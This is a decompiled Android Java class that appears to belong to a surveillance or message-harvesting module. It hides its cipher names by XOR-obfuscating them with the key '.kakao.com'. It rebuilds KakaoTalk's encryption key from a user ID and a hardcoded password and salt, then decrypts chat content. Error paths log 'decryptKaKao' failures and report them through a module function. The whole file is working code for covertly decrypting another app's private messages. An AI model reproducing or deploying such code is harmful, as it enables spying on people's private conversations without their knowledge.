package com.network.c;

import android.util.Base64;
import com.network.android.c.a.b;
import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public final class a {

    /* renamed from: a  reason: collision with root package name */
    static String f137a;
    static String b = c("6f2e3244222d6d4c3f266d38543b000b4a0a010a");
    static String c = c("6f2e32");
    private static final byte[] d = {15, 8, 1, 0, 25, 71, 37, -36, 21, -11, 23, -32, -31, 21, 12, 53};
    private static final IvParameterSpec e = new IvParameterSpec(d);
    private static final char[] f = {22, '\b', '\t', 'o', 2, 23, '+', '\b', '!', '!', '\n', 16, 3, 3, 7, 6};
    private byte[] g = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    private Cipher h;
    private Cipher i;

    static {
        f137a = c("7e29243c283b6630272c6f25255954596c2a3b2c6b384c28232c03212c");
        f137a = c("7e29243c283b6630272c6f25255954596c2a3b2c6b384c28232c03212c");
    }

    public a(long j) {
        if (j <= 0) {
            throw new IllegalStateException("userId is not ready.");
        }
        this.g = a(j);
        SecretKeySpec secretKeySpec = new SecretKeySpec(SecretKeyFactory.getInstance(f137a).generateSecret(new PBEKeySpec(f, this.g, 2, 256)).getEncoded(), c);
        this.h = Cipher.getInstance(b);
        this.h.init(1, secretKeySpec, e);
        this.i = Cipher.getInstance(b);
        this.i.init(2, secretKeySpec, e);
    }

    private static String a(String str, String str2) {
        try {
            char[] charArray = str2.toCharArray();
            char[] charArray2 = str.toCharArray();
            int length = charArray2.length;
            int length2 = charArray.length;
            char[] cArr = new char[length];
            for (int i2 = 0; i2 < length; i2++) {
                cArr[i2] = (char) (charArray2[i2] ^ charArray[i2 % length2]);
            }
            return new String(cArr);
        } catch (Exception e2) {
            return null;
        }
    }

    private static byte[] a(long j) {
        int i2 = 0;
        byte[] bArr = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
        byte[] bytes = String.valueOf(j).getBytes("UTF-8");
        while (i2 < bArr.length && bytes.length > i2) {
            bArr[i2] = bytes[i2];
            i2++;
        }
        return bArr;
    }

    private static byte[] b(String str) {
        int i2 = 0;
        byte[] bArr = new byte[(str.length() / 2)];
        int i3 = 0;
        while (i3 + 1 < str.length()) {
            bArr[i2] = (byte) (Character.digit(str.charAt(i3), 16) << 4);
            bArr[i2] = (byte) (bArr[i2] + ((byte) Character.digit(str.charAt(i3 + 1), 16)));
            i3 += 2;
            i2++;
        }
        return bArr;
    }

    private static String c(String str) {
        try {
            return a(new String(b(str), "UTF-8"), ".kakao.com");
        } catch (Throwable th) {
            return "";
        }
    }

    public final String a(String str) {
        try {
            return new String(this.i.doFinal(Base64.decode(str, 0)), "UTF-8");
        } catch (Throwable th) {
            com.network.android.c.a.a.a("kakaoGetContentIM addImSingleEntryKaKao decryptKaKao Throwable- " + th.getMessage(), th);
            b.a(1, 1022, "kakao");
            return "";
        }
    }
}
